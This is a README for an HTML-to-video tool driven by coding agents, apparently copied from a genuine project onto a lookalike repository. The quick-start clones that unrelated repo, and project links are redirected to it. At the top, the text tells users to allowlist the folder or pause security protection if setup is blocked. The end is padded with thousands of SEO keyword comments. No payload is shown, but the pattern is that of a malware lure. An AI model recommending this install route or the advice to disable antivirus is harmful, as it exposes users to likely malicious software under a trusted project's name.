# html-video


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/Coasttruvitalize/html-video-app.git
cd html-video-app
npm install
npm start
```


<p align="center">
  <img src="docs/assets/hero.png" alt="html-video — HTML becomes video, on your laptop" width="100%" />
</p>

> **HTML becomes video — on your laptop.** Bring your local coding agent (Open Design · Windsurf CLI · Trae CLI · Claude Code · Cursor · Codex · Gemini · Grok · Qwen · OpenCode · Copilot · Aider · Hermes · or the Anthropic API). Describe a video, or **paste an article link / GitHub repo**, and the agent turns it into a multi-frame, fully animated video — then renders it to a real MP4 right on your machine. One agent loop, pluggable rendering engines, a curated template gallery, optional AI soundtrack. Apache-2.0, no per-render fees, no vendor lock-in.

<p align="center">
  <a href="LICENSE"><img alt="License" src="https://img.shields.io/badge/license-Apache%202.0-blue.svg?style=flat-square" /></a>
  <a href="#supported-agents"><img alt="Agents" src="https://img.shields.io/badge/agents-14%20backends-111?style=flat-square" /></a>
  <a href="#showcase"><img alt="Templates" src="https://img.shields.io/badge/templates-21-3ce6ac?style=flat-square" /></a>
  <a href="#turn-a-link-into-a-video"><img alt="Sources" src="https://img.shields.io/badge/from-article%20%C2%B7%20repo%20%C2%B7%20prompt-9b59b6?style=flat-square" /></a>
  <a href="#soundtrack"><img alt="Soundtrack" src="https://img.shields.io/badge/soundtrack-AI%20music%20%2B%20narration-e67e22?style=flat-square" /></a>
  <a href="#quick-start"><img alt="Quickstart" src="https://img.shields.io/badge/quickstart-3%20commands-22a34a?style=flat-square" /></a>
</p>

<!-- Built by the team behind Open Design — these link to its community on purpose. -->
<p align="center">
  <a href="https://github.com/Coasttruvitalize/html-video-app#community"><img alt="Discord" src="https://img.shields.io/badge/discord-join-5865f2?style=flat-square&logo=discord&logoColor=white" /></a>
  <a href="https://x.com/nexudotio"><img alt="Follow @nexudotio on X" src="https://img.shields.io/badge/follow-%40nexudotio-000000?style=flat-square&logo=x&logoColor=white" /></a>
  <a href="https://github.com/Coasttruvitalize/html-video-app"><img alt="By the Open Design team" src="https://img.shields.io/badge/by-nexu--io%2Fopen--design-ff7043?style=flat-square&logo=github&logoColor=white" /></a>
</p>

<p align="center">
  <b>An official project by the <a href="https://open-design.ai">Open Design</a> team</b> · <a href="https://open-design.ai">open-design.ai</a>
</p>

<p align="center"><b>English</b> · <a href="README.zh-CN.md">简体中文</a></p>

---

## Showcase

Every template below is a real, animated single-file HTML video — these are live renders, not mockups. Drop one in, let the agent fill it with your content, export to MP4.

<table>
<tr>
<td width="50%"><img src="docs/assets/templates/frame-data-chart-nyt.png" alt="NYT-style data chart" /></td>
<td width="50%"><img src="docs/assets/templates/frame-glitch-title.png" alt="Glitch title" /></td>
</tr>
<tr>
<td><b>frame-data-chart-nyt</b> · data-viz<br/>Editorial NYT-style animated line chart — headline, annotated data points, source line. For "the number went up" stories.</td>
<td><b>frame-glitch-title</b> · title card<br/>Chromatic-aberration glitch title with scanlines. For openers, drops, and "system online" energy.</td>
</tr>
<tr>
<td><img src="docs/assets/templates/frame-liquid-bg-hero.png" alt="Liquid background hero" /></td>
<td><img src="docs/assets/templates/frame-light-leak-cinema.png" alt="Light leak cinema" /></td>
</tr>
<tr>
<td><b>frame-liquid-bg-hero</b> · hero<br/>Aurora liquid-gradient hero with a centered headline. For product reveals and bold statements.</td>
<td><b>frame-light-leak-cinema</b> · cinematic<br/>Warm film-grain + light-leak cinematic frame. For mood, brand films, "a quiet year" storytelling.</td>
</tr>
<tr>
<td><img src="docs/assets/templates/vfx-text-cursor.png" alt="Typewriter cursor VFX" /></td>
<td><img src="docs/assets/templates/frame-logo-outro.png" alt="Logo outro" /></td>
</tr>
<tr>
<td><b>vfx-text-cursor</b> · VFX<br/>Typewriter text with a blinking terminal cursor. For code-style reveals and CLI demos.</td>
<td><b>frame-logo-outro</b> · outro<br/>Clean animated logo end card. For sign-offs and brand stamps at the end of any video.</td>
</tr>
</table>

…and 15 more, including multi-scene product promos, kinetic type, Swiss-grid and Vignelli data cards, decision-tree explainers, Takram-organic motion, and warm-grain editorial. Browse all 21 live in the studio gallery.

---

## Why this exists

HTML→Video is a real category — but every engine is opinionated, and each wants you to learn *its* authoring model:

| Engine | Paradigm | Tradeoff | In html-video |
|---|---|---|---|
| [Hyperframes](https://github.com/heygen-com/hyperframes) | HTML + CSS + GSAP, agent-skill driven | Single rendering paradigm | ✅ **Shipped** — the default engine; renders real MP4 via headless Chromium + ffmpeg |
| [Remotion](https://www.remotion.dev/) | React components | Source-available, paid above 4 devs | 🗺️ Planned |
| [Motion Canvas](https://github.com/motion-canvas/motion-canvas) · [Revideo](https://github.com/redotvideo/revideo) | TypeScript generators on canvas | Best for explainers, code-first | 🗺️ Planned |
| [Manim](https://github.com/3b1b/manim) & friends | Math / 3D first | Niche | 🗺️ Researching |

Picking the right engine per use case, learning each model, and stitching them into one workflow costs real engineering time. Most teams pick one and live with its limits.

**html-video is the meta-layer that sits above all of them.** You talk to your agent; it picks the engine, picks the template, fills in your content, and renders the video. The engine is an implementation detail behind a single adapter interface — one `render(input, ctx)` contract that any backend can satisfy. Add a new engine and every template, every agent, and the whole studio workflow get it for free. No new DSL to learn, no rewrite when you switch engines.

The same idea powers [Open Design](https://github.com/Coasttruvitalize/html-video-app) in the *design* space — an agent meta-layer over many tools. html-video is the *motion* counterpart from the same team.

> **Status:** the pluggable-engine architecture is in place, and the **Hyperframes engine is fully wired up and renders real MP4** — headless Chromium records the animated HTML frame-by-frame and ffmpeg encodes it (libx264). Remotion, Motion Canvas / Revideo, and Manim are on the roadmap: the adapter interface is designed for them, but their adapters aren't built yet. The "In html-video" column above is the single source of truth for what's actually runnable today.

---

## At a glance

| | |
|---|---|
| **Coding agents (14)** | Open Design (Vela) · Windsurf CLI · Trae CLI · Claude Code · Cursor Agent · Codex CLI · Gemini CLI · Grok Build · Qwen Code · OpenCode · GitHub Copilot CLI · Aider · Hermes · Anthropic Messages API — auto-detected on your `PATH`, switchable from the top bar. |
| **Real MP4 render** | Headless Chromium records the animated HTML and ffmpeg encodes it (libx264) — locally, no cloud render, no per-clip fee. |
| **Article / repo → video** | Paste a URL or GitHub repo; the studio fetches it server-side (handles WeChat 公众号 articles) and builds the video from the real content. |
| **21 templates** | Curated, license-clean patterns: data viz, product promos, social shorts, explainers, kinetic type, transitions — previewed live in the gallery. |
| **Multi-frame storyboards** | A content-graph drives multi-scene videos; edit per-frame text inline, reorder, re-render. |
| **AI soundtrack** | Optional background music + narration via MiniMax, mixed into the MP4 at export. |
| **Studio + CLI** | A local browser studio *and* a scriptable `html-video` CLI. |
| **License** | Apache-2.0 — no per-render fees, no seat caps, no contributor agreements. |

---

## How it works

One sentence (or one link) goes in; a real MP4 comes out. The pipeline is the same whether you start from a prompt, an article, or a repo:

```
  prompt / link / repo
        │
        ▼
  ① source fetch        studio pulls the URL or repo server-side, flattens it to Markdown
        │
        ▼
  ② agent loop          your agent reads the material + the picked template's style and emits
        │               a content-graph (the storyboard) + one HTML block per frame
        ▼
  ③ content-graph       multi-frame IR — nodes (entity / data / text) + edges (sequence /
        │               dependency / contrast); topo-sorted into frame order & timing
        ▼
  ④ per-frame HTML      each node becomes a self-contained animated HTML frame on disk
        │
        ▼
  ⑤ Hyperframes render  headless Chromium loads each frame, records it (auto-extending to
        │               cover the frame's own animation), → webm per frame
        ▼
  ⑥ ffmpeg              each webm → mp4 (libx264), then concat into one video;
        │               optional MiniMax music + narration mixed in
        ▼
      your.mp4
```

Steps ②–④ are where the "meta-layer" lives: the agent decides the storyboard and the engine decides how to draw it, and neither leaks into the other. Step ⑤ is engine-specific — swapping in Remotion or Motion Canvas later replaces only that box, leaving the storyboard and the agent loop untouched. Everything runs on your machine; the only network calls are the optional source fetch and the optional soundtrack.

Single-frame videos take a fast path that skips the content-graph — one template, one HTML, straight to render.

---

## Turn a link into a video

This is what most people reach for: hand your agent a link, get a video back. The agents run as local CLIs with no network access of their own, so the studio fetches the source **server-side** and feeds the real content into the generation prompt — no copy-pasting article bodies, and pages behind a login-free server render (like WeChat 公众号) just work.

```
You:   做一个解读视频  https://mp.weixin.qq.com/s/…
Agent: 好，我读完了《用嘴剪视频的时代来了？…》这篇文章 — 这就基于它生成。下一步选风格。
→      multi-frame explainer, built from the article's actual points
```

- **Web article** → fetched and flattened to Markdown. Server-rendered pages like **WeChat 公众号** articles work out of the box.
- **GitHub repo** → description, top-level structure, and README pulled via the public API — great for "explain this open-source project" videos.
- **Just a prompt** → describe the topic and the agent writes the content from scratch.

Whatever the source, it becomes the material the video is actually built from — not decoration around a canned template. The agent reads the fetched content, decides how many scenes it needs, and writes a **content-graph storyboard**: the key points become frames, the relationships between them (this follows that, this contrasts with that) become edges, and the picked template's visual style is applied per frame. So a 1,500-word article turns into a paced multi-scene explainer whose every line traces back to something in the source, and a repo turns into a structured walkthrough of what the project actually is.

---


## Supported agents

Auto-detected on your `PATH`; switch the active one from the studio's top bar. The studio leads with **Open Design (Vela)** — one login, many models, lower cost — then falls back to the first *available* agent so a fresh project always has a working backend.

| Agent | Detection | Invocation |
|---|---|---|
| **Open Design (Vela)** | `vela` / bundled in the Open Design app | ACP over stdio — one login in Open Design, pick any model |
| **Windsurf CLI** | `windsurf` | `windsurf --yolo`, ACP over stdio |
| **Trae CLI** | `traecli` | `traecli acp serve --yolo`, ACP over stdio |
| **Claude Code** | `claude` | `claude --print`, prompt via stdin |
| **Cursor Agent** | `cursor-agent` | `cursor-agent --print` |
| **Codex CLI** | `codex` | `codex exec`, prompt via stdin |
| **Hermes** | `hermes` | Hermes ACP CLI |
| **Gemini CLI** | `gemini` | Prompt via stdin |
| **Grok Build** | `grok` | `grok -p <prompt>` |
| **Qwen Code** | `qwen` | Prompt via stdin |
| **OpenCode** | `opencode` | `opencode run`, prompt via stdin |
| **GitHub Copilot CLI** | `copilot` | `copilot --allow-all-tools`, prompt via stdin |
| **Aider** | `aider` | `aider --message <prompt>` |
| **Anthropic API** | BYOK | Direct Messages API — works with no CLI installed |

Nothing installed? Set an Anthropic key and the studio talks to the Messages API directly.

---

## Soundtrack

Give the finished video a voice. In **Settings → Audio**, add a MiniMax API key, then in the per-project **Soundtrack** panel:

- **Background music** — describe a mood (`calm cinematic ambient, slow build`); MiniMax generates an instrumental track.
- **Narration** — type a script; MiniMax reads it (TTS).

Both are mixed into the exported MP4 (music ducked under the voice, optional fade-in/out) via ffmpeg. No key configured? The rest of the studio works unchanged.

---

## Template gallery

The 21 templates aren't a random grab-bag — each one is a self-contained, agent-readable unit described by a `template.html-video.yaml` manifest the studio scans at startup. A manifest carries everything the agent needs to pick and drive the template without opening the HTML:

- **What it's for** — `category`, `tags`, and a `best_for` list (e.g. *"Corporate slide"*, *"Minimal report card"*) that `search-templates` matches your intent against.
- **What it outputs** — supported resolutions, aspect ratios, fps, duration bounds, whether it has an alpha channel or audio.
- **What goes in** — an `inputs` JSON schema, so the agent knows exactly which text/data slots to fill.
- **License provenance** — an SPDX id plus explicit `attribution_required` / `redistribution_allowed` / `commercial_use` flags, and an `assets_attribution` block pointing at the upstream source URL.

That last part is deliberate. Every template is **license-clean by construction**: forks carry their original license, the repo-root [`NOTICE.md`](templates/NOTICE.md) records each source and SPDX, and nothing without a clear permissive license ships. So you can put any of them in commercial work without an audit. Templates span data viz (NYT-style charts, Swiss/Vignelli grids), titles & VFX (glitch, kinetic type, typewriter cursor), heroes & cinematics (liquid gradients, light-leak, warm grain), product promos (15s / 30s multi-scene), and explainer scaffolds (decision trees) — and the format is open, so community templates drop in the same way.

---

## Architecture

```
packages/
├── core/                  Project / Asset / ContentGraph types, registries, orchestrator,
│                          MiniMax provider + ffmpeg audio mux
├── content-graph/         Multi-frame storyboard IR (nodes + edges, topo-sort)
│ runtime/               Agent runtime — detect / spawn / stream
│                          (Open Design/Vela · Windsurf CLI · Trae CLI · Claude · Cursor · Codex · Gemini · Grok · Qwen · OpenCode · Copilot · Aider · Hermes · Anthropic API)
├── adapter-hyperframes/   Hyperframes engine adapter — real render via Chromium + ffmpeg
├── cli/                   `html-video` command + the studio HTTP server + source fetching
└── project-studio/        Browser studio UI (chat, template gallery, frames, soundtrack, export)
templates/                 21 curated, license-clean video templates
research/                  RFCs (engine adapter / template metadata / agent skill / content-graph)
```

---

## Roadmap

- [x] Engine adapter spec — one interface, N backends
- [x] Template metadata format — license-first, agent-readable
- [x] Multi-frame storyboard workflow (content-graph)
- [x] Studio: live template gallery, agent switcher, per-frame text editing
- [x] Source material: article / GitHub-repo → video
- [x] AI soundtrack (MiniMax music + narration), mixed at export
- [x] Real MP4 render — Hyperframes engine via headless Chromium + ffmpeg
- [x] Agent model selection — Open Design (Vela) backend, live model catalog
- [ ] Adapters for Remotion / Motion Canvas / Revideo
- [ ] Agent skill packages + a template marketplace

---

## References & lineage

| Project | Role here |
|---|---|
| [Open Design](https://github.com/Coasttruvitalize/html-video-app) | Sister project — the design-agent meta-layer; same team, shared philosophy |
| [HTML Anything](https://github.com/nexu-io/html-anything) | Sister project — HTML for *static* deliverables; html-video is the *motion* side |
| [Hyperframes](https://github.com/heygen-com/hyperframes) | The shipped engine adapter; the HTML+CSS+GSAP rendering paradigm and the source of several Apache-2.0 templates |

## License

[Apache-2.0](LICENSE)

## Built by

[nexu-io](https://github.com/nexu-io) — the team behind [Open Design](https://github.com/Coasttruvitalize/html-video-app). Join the [Discord](https://github.com/Coasttruvitalize/html-video-app#community) · follow [@nexudotio](https://x.com/nexudotio).


<!-- nodejs npm javascript typescript package module library framework windows linux macos -->
<!-- html-video-app - tool utility software - download install setup -->
<!-- how to build customizable html-video-app tester | advanced html-video-app editor | minimal html-video-app package | html-video-app creator | new version html-video-app downloader | macos self hosted html-video-app software | reliable html-video-app application | getting started secure html-video-app | get html-video-app package | tar.gz secure html-video-app | macos safe html-video-app cli | tutorial html-video-app parser | html-video-app port | windows html-video-app server | documentation html-video-app | use html-video-app sdk | zip html-video-app downloader | safe html-video-app analyzer | new version self hosted html-video-app | fedora html-video-app analyzer | html video app demo | configure html-video-app mobile | debian html-video-app debugger | build configurable html-video-app | html-video-app mobile | guide html-video-app cli | minimal html-video-app compressor | latest version html-video-app scanner | free html-video-app engine | advanced html-video-app | docs html-video-app reader | fast html-video-app validator | local html-video-app tool | cross platform html-video-app builder | documentation html-video-app checker | github html-video-app creator | use html-video-app | open simple html-video-app application | run html-video-app desktop | download for linux html-video-app tracker | how to download self hosted html-video-app | centos self hosted html-video-app client | start html-video-app encoder | customizable html-video-app analyzer | download for mac html-video-app service | ubuntu configurable html-video-app monitor | centos modern html-video-app | tutorial html-video-app | github html-video-app addon | html video app benchmark -->
<!-- fast html-video-app scanner | use html-video-app debugger | run html-video-app | windows html-video-app reader | how to install html-video-app software | wiki html-video-app | new version simple html-video-app creator | download html-video-app compressor | source code html-video-app replacement | html video app alternative | debian minimal html-video-app | easy html-video-app addon | install html-video-app uploader | zip reliable html-video-app engine | online html-video-app optimizer | new version extensible html-video-app | wiki html-video-app api | stable html-video-app monitor | docs html-video-app port | download for linux html-video-app program | html-video-app viewer | run on linux html-video-app fork | getting started open source html-video-app | getting started html-video-app mirror | quick start html-video-app generator | free download html-video-app sdk | linux html-video-app program | fedora html-video-app generator | stable html-video-app compressor | download for mac html-video-app extractor | configure html-video-app gui | how to use html-video-app viewer | html video app cheat sheet | open source html-video-app monitor | how to build reliable html-video-app | fast html-video-app application | demo html-video-app | production ready html-video-app utility | portable html-video-app wrapper | updated modular html-video-app downloader | tutorial html-video-app cli | documentation html-video-app engine | html video app not working | portable html-video-app decoder | html-video-app downloader | examples simple html-video-app app | source code html-video-app creator | demo html-video-app application | how to deploy html-video-app debugger | launch html-video-app parser -->
<!-- advanced html-video-app software | deploy html-video-app sdk | stable html-video-app mirror | deploy html-video-app builder | top html-video-app addon | compile self hosted html-video-app extension | walkthrough modern html-video-app compressor | minimal html-video-app | latest version html-video-app | github html-video-app desktop | how to download html-video-app builder | easy html-video-app | examples html-video-app | powerful html-video-app tester | 2026 html-video-app wrapper | beginner html-video-app library | html-video-app decoder | html-video-app extension | download for mac html-video-app replacement | modular html-video-app framework | free html-video-app application | zip modern html-video-app framework | download for mac customizable html-video-app | configurable html-video-app module | open source html-video-app tracker | download for mac fast html-video-app | download for mac top html-video-app optimizer | demo high performance html-video-app fork | simple html-video-app decoder | run on linux html-video-app | sample html-video-app framework | windows html-video-app | open source safe html-video-app | self hosted html-video-app analyzer | local html-video-app analyzer | html-video-app extractor | top html-video-app package | free html-video-app tester | github html-video-app viewer | modern html-video-app client | html video app setup | html-video-app framework | beginner free html-video-app | wiki html-video-app cli | git clone html-video-app application | html-video-app builder | simple html-video-app | how to build html-video-app compressor | local html-video-app package | arch high performance html-video-app alternative -->
<!-- compile html-video-app | how to configure html-video-app validator | download for windows html-video-app package | fast html-video-app optimizer | 2025 secure html-video-app | download for windows html-video-app debugger | quickstart html-video-app generator | stable html-video-app extractor | new version html-video-app validator | html-video-app plugin | launch html-video-app monitor | offline html-video-app binding | html video app workflow | 2026 html-video-app cli | modular html-video-app encoder | modular html-video-app | debian online html-video-app | customizable html-video-app | 2025 html-video-app | how to setup html-video-app module | centos secure html-video-app | local html-video-app | download for linux html-video-app framework | offline html-video-app | arch html-video-app | how to setup html-video-app api | documentation free html-video-app | html video app review | example safe html-video-app | debian html-video-app engine | powerful html-video-app engine | use configurable html-video-app | portable html-video-app module | wiki html-video-app alternative | how to deploy high performance html-video-app cli | free download self hosted html-video-app | get html-video-app reader | sample html-video-app api | html video app best practice | ubuntu html-video-app compressor | getting started html-video-app tester | deploy offline html-video-app monitor | extensible html-video-app framework | how to build html-video-app wrapper | new version reliable html-video-app | latest version html-video-app parser | get html-video-app platform | windows github html-video-app converter | download html-video-app debugger | centos simple html-video-app -->
<!-- arch html-video-app framework | tar.gz html-video-app editor | use html-video-app server | beginner html-video-app server | html video app test | launch html-video-app plugin | free download html-video-app | fast html-video-app server | html-video-app logger | run on windows html-video-app optimizer | quick start reliable html-video-app generator | 2025 html-video-app extension | get portable html-video-app | html video app download | new version html-video-app | top html video app | execute html-video-app optimizer | html video app workshop | linux html-video-app fork | free html-video-app cli | lightweight html-video-app web | linux html-video-app clone | how to download html-video-app generator | walkthrough html-video-app fork | offline html-video-app decoder | new version html-video-app sdk | install offline html-video-app | demo html-video-app web | compile html-video-app library | how to use online html-video-app | download for mac html-video-app uploader | new version html-video-app tool | html video app kubernetes | production ready html-video-app compressor | easy html-video-app generator | build html-video-app | how to run html-video-app checker | portable html-video-app framework | open html-video-app app | sample modular html-video-app downloader | stable html-video-app reader | examples html-video-app mobile | html-video-app checker | html video app pipeline | easy html-video-app engine | latest version portable html-video-app | easy html-video-app binding | tutorial html-video-app server | configure html-video-app | how to build html-video-app software -->
<!-- top html-video-app debugger | launch html-video-app tester | how to configure fast html-video-app | guide html-video-app port | zip github html-video-app | online html-video-app tool | extensible html-video-app server | arch html-video-app alternative | linux html-video-app | tar.gz html-video-app port | high performance html-video-app api | build html-video-app program | portable html-video-app | run html-video-app server | native html-video-app | extensible html-video-app port | ubuntu html-video-app tool | how to run html-video-app software | online html-video-app converter | cross platform html-video-app converter | html-video-app software | how to install modular html-video-app port | run html-video-app framework | html-video-app gui | html video app course | how to install html-video-app | run html-video-app editor | fast html-video-app engine | quick start best html-video-app | html video app podcast | sample html-video-app alternative | windows html-video-app analyzer | html-video-app fork | how to download html-video-app | deploy html-video-app downloader | download for linux html-video-app scanner | setup html-video-app client | git clone html-video-app client | tar.gz cross platform html-video-app addon | fast html-video-app uploader | download for windows html-video-app desktop | configure html-video-app web | html video app vs | 2025 html-video-app uploader | compile html-video-app tracker | linux html-video-app api | latest version html-video-app platform | latest version stable html-video-app | download for linux advanced html-video-app | lightweight html-video-app viewer -->
<!-- run on mac html-video-app utility | wiki best html-video-app | example html-video-app | latest version html-video-app creator | html-video-app encoder | html-video-app app | modern html-video-app editor | html video app cloud | lightweight html-video-app replacement | top html-video-app server | how to setup html-video-app mirror | getting started html-video-app encoder | download for windows advanced html-video-app module | how to run configurable html-video-app api | html-video-app copy | getting started local html-video-app | how to install html-video-app service | source code low latency html-video-app port | zip html-video-app mirror | how to configure html-video-app parser | how to use html-video-app | run on windows html-video-app cli | docs html-video-app | source code html-video-app fork | quick start html-video-app encoder | self hosted html-video-app logger | best html-video-app checker | execute html-video-app utility | documentation html-video-app downloader | docs top html-video-app | how to use lightweight html-video-app | open source offline html-video-app tool | fedora easy html-video-app application | centos html-video-app sdk | free html-video-app scanner | quick start html-video-app server | install html-video-app utility | how to run configurable html-video-app | download for linux html-video-app | html video app fix | open source html-video-app tool | example html-video-app tester | github html-video-app scanner | quick start top html-video-app | secure html-video-app library | setup html-video-app addon | extensible html-video-app replacement | start html-video-app tester | download for mac html-video-app downloader | demo html-video-app addon -->
<!-- lightweight html-video-app | centos html-video-app mobile | easy html-video-app parser | cross platform html-video-app gui | macos html-video-app platform | fast html-video-app app | low latency html-video-app software | offline html-video-app analyzer | minimal html-video-app converter | zip html-video-app copy | html video app webinar | github customizable html-video-app framework | github html-video-app encoder | html-video-app module | html-video-app desktop | quickstart html-video-app validator | local html-video-app checker | local html-video-app viewer | open source simple html-video-app | use html-video-app plugin | new version local html-video-app | html video app bug | quick start open source html-video-app | beginner configurable html-video-app converter | build html-video-app generator | run on windows best html-video-app | how to configure html-video-app builder | download for windows html-video-app utility | html-video-app client | deploy html-video-app module | git clone html-video-app sdk | fast html-video-app | html-video-app validator | tutorial safe html-video-app | git clone html-video-app software | html-video-app package | html-video-app server | walkthrough local html-video-app | open source html-video-app compressor | html video app book | install html-video-app application | tar.gz html-video-app package | debian html-video-app binding | lightweight html-video-app scanner | modern html-video-app framework | html-video-app tester | execute html-video-app sdk | how to run top html-video-app | safe html-video-app tracker | simple html-video-app uploader -->
<!-- html-video-app platform | source code html-video-app validator | start free html-video-app | how to configure html-video-app wrapper | free html video app | html video app error | beginner self hosted html-video-app | advanced html-video-app api | fedora html-video-app optimizer | example html-video-app plugin | html-video-app analyzer | html video app ci cd | run on mac html-video-app framework | setup html-video-app checker | install html-video-app replacement | 2026 html-video-app | examples html-video-app binding | how to deploy html-video-app desktop | ubuntu html-video-app application | windows low latency html-video-app service | how to build modern html-video-app | low latency html-video-app api | setup html-video-app | modern html-video-app extractor | how to build html-video-app | html video app blog | configurable html-video-app | how to install reliable html-video-app | customizable html-video-app engine | how to install html-video-app uploader | beginner html-video-app mobile | is html video app good | configure html-video-app wrapper | how to setup html-video-app parser | best html video app | sample html-video-app | guide html-video-app clone | offline html-video-app framework | minimal html-video-app software | is html video app legit | lightweight html-video-app parser | linux top html-video-app | html-video-app web | minimal html-video-app logger | windows html-video-app decoder | advanced html-video-app extractor | production ready html-video-app | 2025 html-video-app desktop | build lightweight html-video-app | html-video-app optimizer -->
<!-- production ready html-video-app creator | macos html-video-app | 2025 html-video-app package | setup github html-video-app | ubuntu self hosted html-video-app | macos html-video-app wrapper | html-video-app uploader | latest version safe html-video-app | walkthrough free html-video-app | offline html-video-app sdk | download for windows html-video-app reader | how to run html-video-app platform | windows html-video-app encoder | free download html-video-app logger | run html-video-app tool | best html-video-app extension | how to run html-video-app | start offline html-video-app | local html-video-app validator | github html-video-app | html-video-app utility | self hosted html-video-app encoder | html-video-app service | how to install extensible html-video-app | how to run html-video-app fork | free html-video-app desktop | open html-video-app sdk | github html-video-app server | examples html-video-app optimizer | open html-video-app analyzer | download for windows html-video-app | html-video-app program | source code html-video-app api | launch open source html-video-app | centos html-video-app gui | github self hosted html-video-app | free download html-video-app framework | tar.gz html-video-app | free html-video-app mobile | 2026 html-video-app mobile | html video app docker | open source html-video-app | html-video-app converter | zip html-video-app | open source html-video-app optimizer | git clone html-video-app generator | arch cross platform html-video-app compressor | open html-video-app web | how to configure html-video-app checker | run on linux html-video-app generator -->

<!-- Last updated: 2026-06-09 18:23:53 -->
